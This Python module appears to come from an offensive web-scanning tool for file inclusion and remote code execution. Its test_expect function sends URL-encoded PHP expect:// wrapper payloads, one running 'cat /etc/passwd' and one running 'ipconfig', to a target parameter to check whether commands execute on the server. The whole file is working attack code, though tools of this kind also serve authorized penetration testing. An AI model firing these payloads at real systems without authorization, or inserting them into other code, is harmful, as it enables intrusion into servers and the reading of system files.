import urllib.parse as urlparse
from src.utils.arguments import args
from src.configs.config import *
from src.utils.stats import stats
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils import colors

def test_expect(url, post):
    if(args.verbose):
            print(colors.blue("[i]") + " Testing with expect wrapper...")

    tests = []
    tests.append("expect%3A%2F%2Fcat%20%2Fetc%2Fpasswd")
    tests.append("expect%3A%2F%2Fipconfig")

    for i in range(len(tests)):
        u, reqHeaders, postTest = prepareRequest(args.param, tests[i], url, post)
        _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "EXPECT")
        if(not br): return
        if(i == 1 and args.quick): return
    return